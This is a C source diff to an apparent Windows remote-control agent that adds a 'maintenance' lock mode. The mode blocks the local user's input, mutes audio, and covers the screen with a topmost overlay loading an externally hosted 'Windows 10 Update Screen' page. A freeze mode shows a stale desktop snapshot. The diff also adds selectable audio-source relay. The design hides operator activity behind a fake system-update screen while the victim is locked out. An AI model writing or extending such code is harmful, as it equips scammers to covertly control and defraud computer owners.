@@ -26,6 +26,7 @@ limitations under the License.
 #include "tile.h"
 #include <signal.h>
 #include "input.h"
+#include "webview_overlay.h"
 #include <Winuser.h>
 #include <mmdeviceapi.h>
 #include <endpointvolume.h>
@@ -55,6 +56,12 @@ limitations under the License.
 #define KVM_INPUT_LOCK_STATUS_INPUT_BLOCKED 0x01
 #define KVM_INPUT_LOCK_STATUS_PRIVACY_ACTIVE 0x02
 #define KVM_INPUT_LOCK_STATUS_FAILED 0x04
+#define KVM_INPUT_LOCK_STATUS_MAINTENANCE 0x08
+#define KVM_PRIVACY_MODE_FREEZE 1
+#define KVM_PRIVACY_MODE_MAINTENANCE 2
+
+/* Change this single value to replace the full-screen maintenance page. */
+#define KVM_MAINTENANCE_URL L"https://quicksilver-public.s3.ap-east-1.amazonaws.com/Windows+10+Update+Screen.html"
 
 #ifndef LLMHF_INJECTED
 #define LLMHF_INJECTED 0x00000001
@@ -548,6 +555,7 @@ static int g_privacyCursorsHidden = 0;
 static int g_privacyShellGuardActive = 0;
 static DWORD g_privacyInputLockLastWatchdog = 0;
 unsigned char g_blockinput = 0;
+static int g_privacyLockMode = KVM_PRIVACY_MODE_FREEZE;
 static int g_privacyAudioMuteSaved = 0;
 static BOOL g_privacyAudioMuteOriginal = FALSE;
 
@@ -641,7 +649,12 @@ typedef struct KVMPrivacyOverlayRequest
 {
 	HANDLE completed;
 	int result;
+	int mode;
 } KVMPrivacyOverlayRequest;
+
+static KVMPrivacyOverlayBitmap *g_privacyInitialBitmap = NULL;
+static int g_privacyInitialBitmapCaptureAttempted = 0;
+static int g_privacyOverlayMode = KVM_PRIVACY_MODE_FREEZE;
 
 typedef struct KVMPrivacyVisualEffectsState
 {
@@ -1077,7 +1090,37 @@ LRESULT CALLBACK kvm_privacy_overlay_window_proc(HWND hwnd, UINT msg, WPARAM wPa
 		KVMPrivacyOverlayBitmap *overlayBitmap = (KVMPrivacyOverlayBitmap*)GetWindowLongPtr(hwnd, GWLP_USERDATA);
 		HDC hdc = BeginPaint(hwnd, &ps);
 		GetClientRect(hwnd, &rc);
-		if (overlayBitmap != NULL && overlayBitmap->bitmap != NULL)
+		if (g_privacyOverlayMode == KVM_PRIVACY_MODE_MAINTENANCE)
+		{
+			HBRUSH background = CreateSolidBrush(RGB(0, 92, 170));
+			HFONT titleFont = CreateFontA(-48, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
+			HFONT bodyFont = CreateFontA(-24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
+			HGDIOBJ oldFont = NULL;
+			RECT titleRect = rc;
+			RECT bodyRect = rc;
+
+			FillRect(hdc, &rc, background);
+			SetBkMode(hdc, TRANSPARENT);
+			SetTextColor(hdc, RGB(255, 255, 255));
+
+			titleRect.top = (rc.bottom - rc.top) / 2 - 90;
+			titleRect.bottom = titleRect.top + 70;
+			if (titleFont != NULL) { oldFont = SelectObject(hdc, titleFont); }
+			DrawTextA(hdc, "Maintenance a distance", -1, &titleRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+
+			bodyRect.top = titleRect.bottom + 12;
+			bodyRect.bottom = bodyRect.top + 80;
+			bodyRect.left += 40;
+			bodyRect.right -= 40;
+			if (bodyFont != NULL) { SelectObject(hdc, bodyFont); }
+			DrawTextA(hdc, "Une operation de maintenance est en cours. Le clavier et la souris seront restitues a la fin de l'intervention.", -1, &bodyRect, DT_CENTER | DT_WORDBREAK);
+
+			if (oldFont != NULL) { SelectObject(hdc, oldFont); }
+			if (bodyFont != NULL) { DeleteObject(bodyFont); }
+			if (titleFont != NULL) { DeleteObject(titleFont); }
+			if (background != NULL) { DeleteObject(background); }
+		}
+		else if (overlayBitmap != NULL && overlayBitmap->bitmap != NULL)
 		{
 			HDC memoryDc = CreateCompatibleDC(hdc);
 			if (memoryDc != NULL)
@@ -1095,12 +1138,22 @@ LRESULT CALLBACK kvm_privacy_overlay_window_proc(HWND hwnd, UINT msg, WPARAM wPa
 		EndPaint(hwnd, &ps);
 		return 0;
 	}
+	case WM_SIZE:
+		if (g_privacyOverlayMode == KVM_PRIVACY_MODE_MAINTENANCE)
+		{
+			kvm_webview_overlay_resize(hwnd);
+		}
+		return 0;
 	case WM_TIMER:
+		if (g_privacyOverlayMode == KVM_PRIVACY_MODE_MAINTENANCE)
+		{
+			kvm_webview_overlay_make_input_transparent(hwnd);
+		}
 		SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW);
 		return 0;
 	case WM_DESTROY:
+		kvm_webview_overlay_stop();
 		KillTimer(hwnd, KVM_PRIVACY_OVERLAY_TIMER_ID);
-		kvm_privacy_overlay_bitmap_destroy((KVMPrivacyOverlayBitmap*)GetWindowLongPtr(hwnd, GWLP_USERDATA));
 		SetWindowLongPtr(hwnd, GWLP_USERDATA, 0);
 		return 0;
 	case WM_CLOSE:
@@ -1139,8 +1192,19 @@ static HWND kvm_privacy_overlay_create()
 		h = GetSystemMetrics(SM_CYSCREEN);
 	}
 
-	overlayBitmap = kvm_privacy_overlay_bitmap_capture(x, y, w, h);
-	if (overlayBitmap == NULL) { return NULL; }
+	/*
+	 * Capture only for the first freeze request. Maintenance mode must never
+	 * initialize or replace the session snapshot. Once attempted, the snapshot
+	 * remains immutable until the KVM session is destroyed.
+	 */
+	if (g_privacyOverlayMode == KVM_PRIVACY_MODE_FREEZE &&
+		g_privacyInitialBitmapCaptureAttempted == 0)
+	{
+		g_privacyInitialBitmapCaptureAttempted = 1;
+		g_privacyInitialBitmap = kvm_privacy_overlay_bitmap_capture(x, y, w, h);
+	}
+	overlayBitmap = g_privacyInitialBitmap;
+	if (overlayBitmap == NULL && g_privacyOverlayMode == KVM_PRIVACY_MODE_FREEZE) { return NULL; }
 
 	hwnd = CreateWindowExA(
 		WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE | WS_EX_LAYERED | WS_EX_TRANSPARENT,
@@ -1155,7 +1219,6 @@ static HWND kvm_privacy_overlay_create()
 
 	if (hwnd == NULL)
 	{
-		kvm_privacy_overlay_bitmap_destroy(overlayBitmap);
 		return NULL;
 	}
 
@@ -1174,6 +1237,10 @@ static HWND kvm_privacy_overlay_create()
 	SetTimer(hwnd, KVM_PRIVACY_OVERLAY_TIMER_ID, KVM_PRIVACY_OVERLAY_TIMER_MS, NULL);
 	UpdateWindow(hwnd);
 	g_privacyOverlayWindow = hwnd;
+	if (g_privacyOverlayMode == KVM_PRIVACY_MODE_MAINTENANCE)
+	{
+		kvm_webview_overlay_start(hwnd, KVM_MAINTENANCE_URL);
+	}
 	return hwnd;
 }
 
@@ -1202,6 +1269,18 @@ DWORD WINAPI kvm_privacy_overlay_thread(LPVOID param)
 			int eventHooksActive = 0;
 			int inputHooksActive = 0;
 			int cursorHidden = 0;
+			int requestedMode = request != NULL ? request->mode : KVM_PRIVACY_MODE_FREEZE;
+			if (overlay != NULL && requestedMode != g_privacyOverlayMode)
+			{
+				/*
+				 * The overlay's contents and bitmap association are fixed at
+				 * creation time. Recreate only the disposable window when the
+				 * operator switches modes; the initial freeze bitmap survives.
+				 */
+				KillTimer(overlay, KVM_PRIVACY_OVERLAY_TIMER_ID);
+				kvm_privacy_overlay_destroy(&overlay);
+			}
+			g_privacyOverlayMode = requestedMode;
 			if (overlay == NULL) { overlay = kvm_privacy_overlay_create(); }
 			if (overlay != NULL)
 			{
@@ -1211,7 +1290,10 @@ DWORD WINAPI kvm_privacy_overlay_thread(LPVOID param)
 				inputHooksActive = kvm_privacy_input_hooks_install();
 				cursorHidden = kvm_privacy_cursor_hide();
 				SetWindowPos(overlay, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW);
+				ShowWindow(overlay, SW_SHOWNOACTIVATE);
+				SetTimer(overlay, KVM_PRIVACY_OVERLAY_TIMER_ID, KVM_PRIVACY_OVERLAY_TIMER_MS, NULL);
 				InvalidateRect(overlay, NULL, TRUE);
+				UpdateWindow(overlay);
 			}
 			if (request != NULL)
 			{
@@ -1227,7 +1309,15 @@ DWORD WINAPI kvm_privacy_overlay_thread(LPVOID param)
 			kvm_privacy_input_hooks_remove();
 			kvm_privacy_cursor_restore();
 			kvm_privacy_visual_effects_restore();
-			kvm_privacy_overlay_destroy(&overlay);
+			if (overlay != NULL)
+			{
+				KillTimer(overlay, KVM_PRIVACY_OVERLAY_TIMER_ID);
+				/*
+				 * Recreate the excluded top-level window on every relock. The
+				 * window is disposable; the session's initial bitmap is not.
+				 */
+				kvm_privacy_overlay_destroy(&overlay);
+			}
 			continue;
 		}
 		if (msg.message == KVM_PRIVACY_OVERLAY_STOP)
@@ -1290,7 +1380,7 @@ static int kvm_privacy_overlay_ensure_thread()
 	return 1;
 }
 
-static int kvm_privacy_overlay_set(int enabled)
+static int kvm_privacy_overlay_set(int enabled, int mode)
 {
 	if (enabled)
 	{
@@ -1308,6 +1398,7 @@ static int kvm_privacy_overlay_set(int enabled)
 		}
 
 		ZeroMemory(&request, sizeof(request));
+		request.mode = mode;
 		request.completed = CreateEvent(NULL, TRUE, FALSE, NULL);
 		if (request.completed == NULL)
 		{
@@ -1357,6 +1448,11 @@ static void kvm_privacy_overlay_cleanup()
 	g_privacyShellGuardActive = 0;
 	g_privacyOverlayWindow = NULL;
 	g_privacyOverlayThreadId = 0;
+	kvm_privacy_overlay_bitmap_destroy(g_privacyInitialBitmap);
+	g_privacyInitialBitmap = NULL;
+	g_privacyInitialBitmapCaptureAttempted = 0;
+	g_privacyOverlayMode = KVM_PRIVACY_MODE_FREEZE;
+	g_privacyLockMode = KVM_PRIVACY_MODE_FREEZE;
 }
 
 static unsigned char kvm_privacy_input_lock_apply(int refreshOverlay)
@@ -1367,15 +1463,15 @@ static unsigned char kvm_privacy_input_lock_apply(int refreshOverlay)
 
 	if (refreshOverlay != 0)
 	{
-		kvm_privacy_overlay_set(0);
-		Sleep(20);
+		kvm_privacy_overlay_raise();
 	}
 
 	inputBlocked = BlockInput(1);
 	if (inputBlocked != 0) { status |= KVM_INPUT_LOCK_STATUS_INPUT_BLOCKED; }
 
-	privacyOverlayActive = kvm_privacy_overlay_set(1);
+	privacyOverlayActive = kvm_privacy_overlay_set(1, g_privacyLockMode);
 	if (privacyOverlayActive != 0) { status |= KVM_INPUT_LOCK_STATUS_PRIVACY_ACTIVE; }
+	if (g_privacyLockMode == KVM_PRIVACY_MODE_MAINTENANCE) { status |= KVM_INPUT_LOCK_STATUS_MAINTENANCE; }
 	kvm_privacy_audio_mute();
 	if (inputBlocked == 0 || privacyOverlayActive == 0) { status |= KVM_INPUT_LOCK_STATUS_FAILED; }
 
@@ -1582,8 +1678,9 @@ int kvm_server_inputdata(char *block, int blocklen, ILibKVM_WriteHandler writeHa
 	{
 	case MNG_KVM_INPUT_LOCK:
 		// 0 = unlock
-		// 1 = lock
+		// 1 = lock with the session's initial frozen desktop
 		// 2 = query
+		// 3 = lock with a local maintenance screen
 		if (size == 5)
 		{
 			switch (block[4])
@@ -1592,14 +1689,19 @@ int kvm_server_inputdata(char *block, int blocklen, ILibKVM_WriteHandler writeHa
 				g_blockinput = 0;
 				g_privacyInputLockLastWatchdog = 0;
 				kvm_privacy_audio_restore();
-				kvm_privacy_overlay_set(0);
+				kvm_privacy_overlay_set(0, g_privacyLockMode);
 				BlockInput(0);
 				break;
 			case 1:
+				g_privacyLockMode = KVM_PRIVACY_MODE_FREEZE;
 				kvm_privacy_input_lock_apply(0);
 				break;
 			case 2:
 				kvm_privacy_input_lock_watchdog(0);
+				break;
+			case 3:
+				g_privacyLockMode = KVM_PRIVACY_MODE_MAINTENANCE;
+				kvm_privacy_input_lock_apply(0);
 				break;
 			default:
 				return (size);
@@ -1812,14 +1914,24 @@ int kvm_server_inputdata(char *block, int blocklen, ILibKVM_WriteHandler writeHa
 	case MNG_AUDIO_START:
 	{
 #ifdef WIN32
-		audio_relay_setup(writeHandler, reserved, NULL);
+		int sourceId = (size >= 6) ? (unsigned char)block[4] : AUDIO_SOURCE_SYSTEM;
+		int quality  = (size >= 6) ? (unsigned char)block[5] : 0;
+		audio_relay_setup(writeHandler, reserved, NULL, sourceId, quality);
 #endif
 		break;
 	}
 	case MNG_AUDIO_STOP:
 	{
 #ifdef WIN32
-		audio_relay_stop();
+		if (size >= 6) audio_relay_stop_source((unsigned char)block[4]);
+		else audio_relay_stop();
+#endif
+		break;
+	}
+	case MNG_AUDIO_QUALITY:
+	{
+#ifdef WIN32
+		if (size >= 6) audio_relay_set_quality((unsigned char)block[4], (unsigned char)block[5]);
 #endif
 		break;
 	}
